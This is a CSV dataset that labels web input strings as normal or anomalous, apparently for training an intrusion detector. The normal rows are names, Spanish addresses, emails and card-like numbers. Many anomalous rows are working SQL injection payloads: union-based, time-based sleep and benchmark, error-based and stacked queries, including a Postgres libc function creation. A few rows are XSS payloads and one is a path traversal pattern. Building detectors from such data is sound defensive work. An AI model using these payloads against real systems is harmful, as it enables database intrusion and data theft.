payload,length,attack_type,label
12835645n,9,norm,norm
pettitt,7,norm,norm
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",66,sqli,anom
t5m3la,6,norm,norm
6341819669963492,16,norm,norm
camino valbueno 106,19,norm,norm
-5365 or 7517=5726--,20,sqli,anom
"1') where 6720=6720 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"c/ hermenegilda portillo, 70",28,norm,norm
1) or (select * from (select(sleep(5)))ydpu),44,sqli,anom
hanisch@todobetis.mm,20,norm,norm
1%';select sleep(5) and '%'=',29,sqli,anom
"1) as cnpv where 4902=4902 and elt(1210=1210,sleep(5))--",56,sqli,anom
stefana1,8,norm,norm
"c/ cardenal rossell, 85,",24,norm,norm
chang-kang@juegois.sh,21,norm,norm
cabaas del castillo,19,norm,norm
33279,5,norm,norm
rollie,6,norm,norm
-4322')) as magw where 1627=1627 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,236,sqli,anom
-4389'))) or (1139=3499)*3499 and ((('qoch'='qoch,49,sqli,anom
0076747388160328,16,norm,norm
1)) as dgso where 4654=4654 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,216,sqli,anom
rozin,5,norm,norm
gillespi,8,norm,norm
-8187'))) or 1698=2823#,23,sqli,anom
"1""))) and elt(2421=9612,9612) and (((""gbdx"" like ""gbdx",54,sqli,anom
mccaffrie@alcantarapartners.ir,30,norm,norm
1%')) union all select null#,28,sqli,anom
82063475g,9,norm,norm
"1) as drbw where 2380=2380 or 8466=benchmark(5000000,md5(0x694a4745))--",71,sqli,anom
69364169x,9,norm,norm
figuerola,9,norm,norm
"1%"")));select (case when (5464=9350) then 5464 else cast(1 as int)/(select 0 from dual) end) from dual--",104,sqli,anom
armelle,7,norm,norm
9u5es2v83ent2,13,norm,norm
3644619165176311,16,norm,norm
"1"") where 2839=2839 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",118,sqli,anom
zicheng,7,norm,norm
3068571897789618,16,norm,norm
mlida,5,norm,norm
mallorie,8,norm,norm
hurcal-overa,12,norm,norm
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""isbh"" like ""isbh",132,sqli,anom
"1')) as kgfp where 2366=2366;select count(*) from generate_series(1,5000000)--",78,sqli,anom
"-3747"") union all select 8962,8962,8962,8962,8962#",50,sqli,anom
kimbroug,8,norm,norm
"<iframe id=xss / ""onload=alert(/xss/)></iframe>",47,xss,anom
1';select (case when (1412=5313) then 1412 else 1412*(select 1412 from mysql.db) end)#,86,sqli,anom
grace,5,norm,norm
corkstow,8,norm,norm
127ca3o,7,norm,norm
"1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded",52,sqli,anom
knorp5,6,norm,norm
"1%""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""%""=""",110,sqli,anom
nao,3,norm,norm
kit,3,norm,norm
abdel-az,8,norm,norm
g89273t2,8,norm,norm
08enmand15a,11,norm,norm
1' in boolean mode);select (case when (1812=2446) then 1812 else cast(1 as int)/(select 0 from dual) end) from dual--,117,sqli,anom
50400,5,norm,norm
mizerk,6,norm,norm
12796200n,9,norm,norm
5568778491902564,16,norm,norm
84881293t,9,norm,norm
-5021'+(select yadq where 4285=4285 order by 1#,47,sqli,anom
"calle caballeros, 160, 3-b",26,norm,norm
he53e9ona,9,norm,norm
cazoln,6,norm,norm
parmenia,8,norm,norm
"1"")));select pg_sleep(5)--",26,sqli,anom
"plaa de augusto miranda, 193,",29,norm,norm
"-4300"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""klbu""=""klbu",220,sqli,anom
8582534834926521,16,norm,norm
"-1503"" order by 1--",19,sqli,anom
pesado stahler,14,norm,norm
carr97t8,8,norm,norm
"<input type=""image"" src=""javascript:document.cookie=true;"">",59,xss,anom
-9103' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'nlvq'='nlvq,221,sqli,anom
22234,5,norm,norm
"pasaje arquitecto gaudi 85,",27,norm,norm
"1%"");select (case when (5163=4861) then 1 else 5163*(select 5163 from master..sysdatabases) end)--",98,sqli,anom
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""nzgn""=""nzgn",221,sqli,anom
sims,4,norm,norm
vidom.kapatos@discotecateatre.om,32,norm,norm
a9tr8pfag4,10,norm,norm
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",57,sqli,anom
tiberio,7,norm,norm
"1"")) as duny where 3756=3756 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",104,sqli,anom
"(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",84,sqli,anom
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('bacm'='bacm",153,sqli,anom
letemendia dou,14,norm,norm
cohn.of@evasor.ch,17,norm,norm
7839,4,norm,norm
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# miji",101,sqli,anom
shihhai0,8,norm,norm
castro de rei,13,norm,norm
"avda. somosaguas 150, 1?b",25,norm,norm
99eja36r9a,10,norm,norm
"1%"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""%""=""",169,sqli,anom
"-1<layer src=""javascript:document.cookie=true;""></layer>",56,xss,anom
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (7338=7338",117,sqli,anom
paovarat_christian-gerard@audiosat.mp,37,norm,norm
"c/ cal correu, 0,",17,norm,norm
lucas fiallega,14,norm,norm
4702,4,norm,norm
culham,6,norm,norm
7688145682842926,16,norm,norm
"alt=alert(1)//"">",16,xss,anom
frechette8@legami.ly,20,norm,norm
hara,4,norm,norm
calderer ares,13,norm,norm
"c/ francisco de orellana 121, 5-e",33,norm,norm
26540,5,norm,norm
1'+(select lptb where 3861=3861 or sleep(5))+',46,sqli,anom
"c/ toledo 22,",13,norm,norm
1);(select * from (select(sleep(5)))srmq) and (9069=9069,56,sqli,anom
842is2n,7,norm,norm
almatret,8,norm,norm
-1127 or 7391=4954,18,sqli,anom
"romeral, el",11,norm,norm
terradas provasi,16,norm,norm
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",104,sqli,anom
8928022470323777,16,norm,norm
"-7815' union all select 2638,2638,2638,2638,2638--",50,sqli,anom
46225556h,9,norm,norm
870,3,norm,norm
"fonsagrada, a",13,norm,norm
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""ajuh""=""ajuh",172,sqli,anom
fol0ado,7,norm,norm
coderch gordo,13,norm,norm
e23i6gulo,9,norm,norm
85510378n,9,norm,norm
ulrico,6,norm,norm
5856,4,norm,norm
whitwort,8,norm,norm
8812117919949504,16,norm,norm
zlotnick,8,norm,norm
"1 where 9072=9072 and elt(4249=4249,7259)--",43,sqli,anom
drissel,7,norm,norm
sant pere de ribes,18,norm,norm
04249968m,9,norm,norm
48,2,norm,norm
calle horreo 85 10?d,20,norm,norm
"-2610%"") union all select 7779,7779,7779,7779,7779--",52,sqli,anom
"1') as wtev where 5283=5283;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
"1')) union all select null,null,null,null--",43,sqli,anom
frydtberg@archivodeimagenes.cat,31,norm,norm
"1%')));select count(*) from generate_series(1,5000000) and ((('%'='",67,sqli,anom
72906034j,9,norm,norm
"1'||(select 'hrpa' where 1973=1973 union all select null,null,null,null,null,null,null,null,null--",98,sqli,anom
1'))) and (select * from (select(sleep(5)))fzno) and ((('lajk'='lajk,68,sqli,anom
"1'||(select 'ativ' from dual where 4746=4746 union all select null,null,null,null#",82,sqli,anom
"1%""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""%""=""",93,sqli,anom
1%' rlike (select * from (select(sleep(5)))sgvo) and '%'=',58,sqli,anom
"1%"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",49,sqli,anom
1'+(select xruo where 5709=5709 and 7533=7533)+',48,sqli,anom
"espronceda, 174 12-e",20,norm,norm
aldeaseca de alba,17,norm,norm
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",114,sqli,anom
"1'||(select 'wtdz' from dual where 1866=1866 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",139,sqli,anom
quintiliana,11,norm,norm
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""rthl"" like ""rthl",143,sqli,anom
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",89,sqli,anom
11539856c,9,norm,norm
"1)) union all select null,null,null,null,null,null,null#",56,sqli,anom
2112145252606070,16,norm,norm
saluotto cunill,15,norm,norm
-8722%' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'=',197,sqli,anom
96312323f,9,norm,norm
salia,5,norm,norm
alek,4,norm,norm
del nuevo mundo s/n,19,norm,norm
"1"") as fgne where 7207=7207;select pg_sleep(5)--",48,sqli,anom
"1,(select (case when (5885=1825) then 1 else 5885*(select 5885 from master..sysdatabases) end))",95,sqli,anom
5pio,4,norm,norm
santa barbara 28,16,norm,norm
veg*oso,7,norm,norm
1111,4,norm,norm
singyu,6,norm,norm
ru5runears2,11,norm,norm
benzo,5,norm,norm
44394,5,norm,norm
"1) where 5232=5232 union all select null,null,null#",51,sqli,anom
carroar,7,norm,norm
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,sqli,anom
-2745)) as aywp where 9735=9735 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,126,sqli,anom
anafrodita,10,norm,norm
"calle montesol 30,",18,norm,norm
1') waitfor delay '0:0:5' and ('peyv' like 'peyv,48,sqli,anom
9068716333740358,16,norm,norm
//../../../../../../../..{file},31,path-traversal,anom
"1'||(select 'ctgs' where 6809=6809 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",96,sqli,anom
"comandante barja 84,",20,norm,norm
-8684' where 9820=9820 or 6844=5105,35,sqli,anom
"1%""))) and make_set(8191=7813,7813) and (((""%""=""",48,sqli,anom
dillon@indagacion.pa,20,norm,norm
felip campos,12,norm,norm
"c/ mineria, 151 13?g",20,norm,norm
suplementero,12,norm,norm
1;select case when 7717=7717 then 1 else null end--,51,sqli,anom
santa mara la real de nieva,27,norm,norm
5106,4,norm,norm
indiligencia,12,norm,norm
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('uzmy' like 'uzmy,75,sqli,anom
deiadrel,8,norm,norm
+fisgn,6,norm,norm
andee,5,norm,norm
estrada perdig,14,norm,norm
9431159156347522,16,norm,norm
tobias5,7,norm,norm
1728750094813990,16,norm,norm
monte9a,7,norm,norm
vilagut victori,15,norm,norm
ciochon,7,norm,norm
espiloc3o,9,norm,norm
treen2,6,norm,norm
"1"") as kslq where 8669=8669 and 8635=(select count(*) from generate_series(1,5000000))--",88,sqli,anom
raqu$9omo,9,norm,norm
"1%"");select (case when (6179=8476) then 6179 else cast(1 as int)/(select 0 from dual) end) from dual--",102,sqli,anom
8224727422356159,16,norm,norm
kjer@multibuscador.com.ph,25,norm,norm
plmaces de jadraque,19,norm,norm
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('dzzx'='dzzx",115,sqli,anom
rory,4,norm,norm
"1' in boolean mode) or elt(6272=6272,sleep(5))#",47,sqli,anom
bacio bonnin,12,norm,norm
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('swfj' like 'swfj",127,sqli,anom
1') where 5286=5286;select (case when (1123=9550) then 1123 else 1123*(select 1123 from information_schema.character_sets) end)#,128,sqli,anom
-8911%' or 9323=9323#,21,sqli,anom
hilom3r0ismo,12,norm,norm
"manuel de falla 119,",20,norm,norm
mendiz espn,11,norm,norm
"1%""))) and 4595=4595#",21,sqli,anom
-8095') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),205,sqli,anom
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",122,sqli,anom
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- ivku",178,sqli,anom
"plza. okendo 185, 6?c",21,norm,norm
31ena8ada,9,norm,norm
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
todd,4,norm,norm
+payar,6,norm,norm
"1 or elt(6272=6272,sleep(5))# klaw",34,sqli,anom
lafayette@vitalhome.hk,22,norm,norm
"1'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,sqli,anom
fournier,8,norm,norm
nealson,7,norm,norm
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv",52,sqli,anom
strock,6,norm,norm
5ictoriosamente,15,norm,norm
thiel,5,norm,norm
"-4932%"")) or (3076=5927)*5927 and ((""%""=""",41,sqli,anom
4183,4,norm,norm
"-6803"") order by 1#",19,sqli,anom
mgi4a,5,norm,norm
73,2,norm,norm
"1');iif(1157=4542,1,1/0)",24,sqli,anom
42120,5,norm,norm
margheri,8,norm,norm
jazmn,5,norm,norm
nazarena,8,norm,norm
lido,4,norm,norm
kingston@professionalhost.com.ag,32,norm,norm
meier,5,norm,norm
bayly,5,norm,norm
bryant@wave.com.mw,18,norm,norm
villalpando iturbide,20,norm,norm
rafael,6,norm,norm
backy@legami.tz,15,norm,norm
"1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='",122,sqli,anom
jeramey,7,norm,norm
58464i8ab4e,11,norm,norm
45240,5,norm,norm
"-7518"" or elt(8413=3995,3995) and ""cpnf""=""cpnf",46,sqli,anom
43425,5,norm,norm
montell i martinet,18,norm,norm
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",153,sqli,anom
48650,5,norm,norm
santa eufemia del arroyo,24,norm,norm
"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",71,sqli,anom
paucides,8,norm,norm
55842507w,9,norm,norm
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('qfwc'='qfwc",80,sqli,anom
arrigorriaga,12,norm,norm
"pl. santa isabel s/n, 8-d",25,norm,norm
1499600534131254,16,norm,norm
"1' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",65,sqli,anom
donhierro,9,norm,norm
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",160,sqli,anom
"1,(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))",201,sqli,anom
sa6r2,5,norm,norm
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'ybjo'='ybjo",79,sqli,anom
samalot,7,norm,norm
tronchuda,9,norm,norm
"c/ fontans, 124, 10?c",21,norm,norm
enfardeladora,13,norm,norm
2557912970687783,16,norm,norm
darelle,7,norm,norm
1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,117,sqli,anom
76706902q,9,norm,norm
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""ewsr"" like ""ewsr",87,sqli,anom
3909891121634471,16,norm,norm
"1'+(select 'tzyz' where 4912=4912 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",95,sqli,anom
77077342h,9,norm,norm
"1' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,sqli,anom
"1' in boolean mode) union all select null,null,null,null,null,null,null--",73,sqli,anom
juli,4,norm,norm
"1"") as idwa where 2545=2545 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",134,sqli,anom
choon,5,norm,norm
"1')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,sqli,anom
"1))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,sqli,anom
gilbuena,8,norm,norm
1%';select pg_sleep(5)--,24,sqli,anom
4358738088308536,16,norm,norm
38507707a,9,norm,norm
"de la coma, 112 4-b",19,norm,norm
casarejos,9,norm,norm
"manzano, el",11,norm,norm
dnica,5,norm,norm
"cuesta pizarro 12, 4?d",22,norm,norm
buenavista,10,norm,norm
"1%"")) and elt(1210=1210,sleep(5)) and ((""%""=""",45,sqli,anom
orgilles guilbauth,18,norm,norm
75131649x,9,norm,norm
jarandilla de la vera,21,norm,norm
"errekerte 113,",14,norm,norm
7746,4,norm,norm
"-9237') union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",71,sqli,anom
2754013363983769,16,norm,norm
-8234'))) or 9323=9323#,23,sqli,anom
"1)) union all select null,null,null,null,null,null,null,null,null,null#",71,sqli,anom
83042756z,9,norm,norm
-6412%' or 4065=5815 and '%'=',30,sqli,anom
"-8002'))) union all select 6647,6647,6647--",43,sqli,anom
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('cfzp' like 'cfzp",118,sqli,anom
"1%"") union all select null,null,null,null,null,null,null,null,null,null#",72,sqli,anom
"1'||(select 'vsfg' where 3547=3547 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",130,sqli,anom
-2291)) or 4067=5666#,21,sqli,anom
-3107') where 7782=7782 or 8571=8571--,38,sqli,anom
"plza. musico diaz cano 5,",25,norm,norm
97555694k,9,norm,norm
neel@deseoun.aq,15,norm,norm
"-9110"")) union all select 2263,2263,2263,2263,2263#",51,sqli,anom
fregaci5n,9,norm,norm
daroca,6,norm,norm
reid5,5,norm,norm
4599,4,norm,norm
felicitas,9,norm,norm
sinesio,7,norm,norm
"1'||(select 'uvbb' where 7795=7795 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",178,sqli,anom
bravo murillo 18,16,norm,norm
1) and sleep(5) and (4855=4855,30,sqli,anom
"1' and make_set(9860=6956,6956) and 'toru'='toru",48,sqli,anom
guerette,8,norm,norm
-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,213,sqli,anom
c/ hermanos pinzon 178,22,norm,norm
dbra,4,norm,norm
"<img src=""jav ascript:alert('crosssitescripting');"">",52,xss,anom
1;begin user_lock.sleep(5); end# ckxq,37,sqli,anom
ku,2,norm,norm
"1%';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and '%'='",128,sqli,anom
erhard@miplat.il,16,norm,norm
-6202)) or 7845=1962--,22,sqli,anom
97428124d,9,norm,norm
1') and 3560=5467--,19,sqli,anom
pradeep,7,norm,norm
2417,4,norm,norm
monopolizador,13,norm,norm
1' where 4403=4403 rlike sleep(5)#,34,sqli,anom
calle medina azahara 136 5f,27,norm,norm
"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>",79,xss,anom
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('gsjp'='gsjp,85,sqli,anom
"1));iif(5257=5257,1,1/0)",24,sqli,anom
monturi,7,norm,norm
san vicente del palacio,23,norm,norm
"1%')) and elt(1210=1210,sleep(5)) and (('%'='",45,sqli,anom
"1""))) and 7533=7533 and (((""xopd""=""xopd",39,sqli,anom
75261065m,9,norm,norm
"1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",104,sqli,anom
35817134q,9,norm,norm
souther,7,norm,norm
17621392b,9,norm,norm
"1"" where 8732=8732;begin dbms_lock.sleep(5); end--",50,sqli,anom
"callejon giron 124,",19,norm,norm
"1' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",78,sqli,anom
virchick1,9,norm,norm
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),233,sqli,anom
8591363958180567,16,norm,norm
martens@ajuntamentbarcelona2-0.tl,33,norm,norm
abia de la obispala,19,norm,norm
0892478865637376,16,norm,norm
"-7469) where 5875=5875 or make_set(9354=9354,7185)--",52,sqli,anom
avenida presidente carrero blanco 134,37,norm,norm
"pl. espaa, 108, 13?a",20,norm,norm
valdiviezo montull,18,norm,norm
"1"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""dtfg""=""dtfg",194,sqli,anom
38656027l,9,norm,norm
samar,5,norm,norm
6483,4,norm,norm
-3966') or 7338=8657,20,sqli,anom
"-1807')) union all select 9853,9853,9853,9853,9853,9853#",56,sqli,anom
"ginebrosa, la",13,norm,norm
1') as xwlf where 9424=9424;(select * from (select(sleep(5)))acdk)#,67,sqli,anom
"1"" where 2235=2235 union all select null,null,null,null,null--",62,sqli,anom
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",201,sqli,anom
1%' or (select * from (select(sleep(5)))sddo)#,46,sqli,anom
"1,(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",96,sqli,anom
yalile,6,norm,norm
"1"" where 5250=5250;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",115,sqli,anom
abbe@natravea.tk,16,norm,norm
1%';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,97,sqli,anom
de_salis,8,norm,norm
46593,5,norm,norm
mortensen@look2fly.nr,21,norm,norm
31382,5,norm,norm
canudes,7,norm,norm
reinhard,8,norm,norm
1 where 5691=5691 and (select * from (select(sleep(5)))fzno)--,62,sqli,anom
sandy,5,norm,norm
a3o1erada,9,norm,norm
caridad,7,norm,norm
"-5132%"")) or 3038=3038",22,sqli,anom
1776,4,norm,norm
"c/ guzman de alfarache, 113 1?a",31,norm,norm
"1' in boolean mode) or 8421=(select count(*) from generate_series(1,5000000))#",78,sqli,anom
"1"")) as hiuf where 3277=3277 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",211,sqli,anom
buc_falo,8,norm,norm
estrad sivelli,14,norm,norm
35868151l,9,norm,norm
24226,5,norm,norm
calle benifallim 97 10?e,24,norm,norm
7094785480687274,16,norm,norm
"1"") as obbk where 6414=6414 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",200,sqli,anom
fierro@porqueagel.je,20,norm,norm
martn del ro,12,norm,norm
bezante,7,norm,norm
1%';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,68,sqli,anom
"1"") where 6236=6236 or 8514=benchmark(5000000,md5(0x544d5a4c))#",63,sqli,anom
1');begin dbms_lock.sleep(5); end and ('uxzv'='uxzv,51,sqli,anom
1')) order by 1--,17,sqli,anom
gierasch.casini@goovitae.cu,27,norm,norm
van_mete2,9,norm,norm
1%') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',247,sqli,anom
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",100,sqli,anom
3u23pe,6,norm,norm
-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),100,sqli,anom
guasch xifr,11,norm,norm
temprano canavoso,17,norm,norm
1)) as kccx where 7547=7547 union all select null--,51,sqli,anom
9182,4,norm,norm
paris-loisel@viavilano.cr,25,norm,norm
"-6492') union all select 7204,7204--",36,sqli,anom
1'))) and 1743=6793 and ((('rgcv'='rgcv,39,sqli,anom
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",128,sqli,anom
villaviciosa de odn,19,norm,norm
1' in boolean mode) or (select * from (select(sleep(5)))sddo)#,62,sqli,anom
greggory@fighting-machines.gl,29,norm,norm
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('pydi' like 'pydi",224,sqli,anom
"san luis, 117,",14,norm,norm
1%') or (select * from (select(sleep(5)))sddo)#,47,sqli,anom
50684,5,norm,norm
"1"")) and 2388=benchmark(5000000,md5(0x6d457153))#",49,sqli,anom
gussack.reinecke@eddydaniele.pt,31,norm,norm
1' where 6359=6359 and (3020=3020)*6703--,41,sqli,anom
almussafes,10,norm,norm
5169,4,norm,norm
-2707'))) or (8459=8459)*4906 and ((('mwdq'='mwdq,49,sqli,anom
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",189,sqli,anom
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'='",103,sqli,anom
40979614p,9,norm,norm
